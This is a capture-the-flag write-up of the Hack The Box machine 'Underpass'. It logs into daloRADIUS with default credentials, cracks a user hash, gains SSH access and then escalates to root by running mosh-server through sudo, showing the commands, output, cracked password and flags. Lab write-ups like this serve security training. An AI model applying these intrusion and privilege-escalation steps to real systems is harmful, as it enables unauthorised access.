---
layout: post
title: "Hack The Box: Underpass"
date: 2025-05-23
categories: [HackTheBox, Writeup]
tags: [Linux, easy, daloradius, mosh, privilege-escalation]
permalink: /posts/Underpass/
toc: true
---


![Description](/assets/images/UnderPass/image%20(1).png)

**UnderPass** is an **easy-difficulty machine** from Hack The Box that starts with an
exposed **Daloradius** instance, accessible using **default credentials**. Inside the
application, we discover a password **hash** which we successfully crack. The
recovered credentials allow SSH access to the target machine. Once on the box, we
find that we can launch a **mosh server** with root privileges, which we exploit to
escalate our privileges and ultimately gain **root access**.



##  Enumeration
### nmap scan
We begin with an Nmap scan:

```bash
$ nmap -A -Pn 10.10.11.48

Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-01 10:17 W. Central Africa Standard Time
Nmap scan report for 10.10.11.48
Host is up (0.47s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_ 256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open http Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.77 seconds
```

**Open Ports:**
- **22/tcp** – SSH 
- **80/tcp** – HTTP

 Trying to access the website, it looks like we have a default apache page

![Description](/assets/images/UnderPass/image%20(2).png)
### Daloradius web application
Using `dirsearch`, we discovered a hidden web directory at `/daloradius/`, which is commonly associated with the DaloRadius web interface:

```bash
$ dirsearch -u "http://underpass.htb/daloradius/" -t 50

|. _ _ _ _ _ | v0.4.3
(
||| ) (/(|| (| )
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist
size: 11460
Output File: /home/kali/UnderPass/reports/http_underpass.htb/_daloradius__24-1222_12-58-34.txt
Target: http://underpass.htb/
[12:58:34] Starting: daloradius/
[12:58:39] 200 - 221B - /daloradius/.gitignore
[12:58:47] 301 - 323B - /daloradius/app -> http://underpass.htb/daloradius/app/
[12:58:49] 200 - 24KB - /daloradius/ChangeLog
[12:58:51] 301 - 323B - /daloradius/doc -> http://underpass.htb/daloradius/doc/
[12:58:51] 200 - 2KB - /daloradius/docker-compose.yml
[12:58:51] 200 - 2KB - /daloradius/Dockerfile
[12:58:57] 301 - 327B - /daloradius/library ->
http://underpass.htb/daloradius/library/
[12:58:57] 200 - 18KB - /daloradius/LICENSE
[12:59:04] 200 - 10KB - /daloradius/README.md
[12:59:05] 301 - 325B - /daloradius/setup ->
http://underpass.htb/daloradius/setup/
Task Completed
```



##  Exploitation
### initial foothold
While researching daloradius online, I identified a commonly used login path at /daloradius/operators/login.php. Accessing this path revealed a login panel for the daloradius web interface.

![Description](/assets/images/UnderPass/image%20(3).png)
 1. **Accessing DaloRadius**
We navigate to `/daloradius/operators/login.php` and log in with default credentials:

- **Username:** administrator  
- **Password:** radius

![Description](/assets/images/UnderPass/image%20(4).png)
 2. **Retrieving User Hash**
Inside DaloRadius, we find a user `svcMosh` with the following hash:

```
412DD4759978ACFCC81DEAB01B382403
```
![Description](/assets/images/UnderPass/image%20(5).png)

Using [crackstation.net](https://crackstation.net), we crack the hash:

- **Password:** underwaterfriends

 3. **Gaining SSH Access**
We SSH into the box:

```bash
ssh svcMosh@underpass.htb
# Password: underwaterfriends
```

And retrieve the user flag:

```bash
cat ~/user.txt
# -> bbfc40fc1389516f00b23bcb62c85872
```



###  Privilege Escalation

Checking `sudo` privileges:

```bash
sudo -l
```

We find:

```bash
Matching Defaults entries for svcMosh on localhost:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
use_pty
User svcMosh may run the following commands on localhost:
(ALL) NOPASSWD: /usr/bin/mosh-server

```

This means the user `svcMosh` can run the `mosh-server` command as root without needing to type a password.


1. On the victim machine:

```bash
$ sudo /usr/bin/mosh-server

MOSH CONNECT 60001 N7vPqLt4KrX9DfYmHsUw3A
mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein
mosh-devel@mit.edu
License GPLv3+: GNU GPL version 3 or later
http://gnu.org/licenses/gpl.html.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
[mosh-server detached, pid = 3100]
```

2. On the attacker machine:

```bash
$ MOSH_KEY=N7vPqLt4KrX9DfYmHsUw3A mosh-client <ip> 60001

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
Documentation: https://help.ubuntu.com
Management: https://landscape.canonical.com
Support: https://ubuntu.com/pro
System information as of Tue Dec 24 03:25:41 PM UTC 2024
System load: 0.0 Processes: 227
Usage of /: 89.0% of 3.75GB Users logged in: 0
Memory usage: 10% IPv4 address for eth0: 10.129.243.71
Swap usage: 0%
=> / is using 89.0% of 3.75GB
Expanded Security Maintenance for Applications is not enabled.
0 updates can be applied immediately.
Enable ESM Apps to receive additional future security updates.
See
https://ubuntu.com/esm or run: sudo pro status
The list of available updates is more than a week old.
To check for new updates run: sudo apt update
#
```

You're now root:

```bash
id
# uid=0(root) gid=0(root)

cat /root/root.txt
# -> 95bfbcdd99b59de1bead0d706a1c6774
```



##  Summary

-  Enumerated daloradius on web server
-  Used default credentials
-  Cracked hash to gain SSH access
-  Escalated privileges via `mosh-server`

Pwned! 🎉

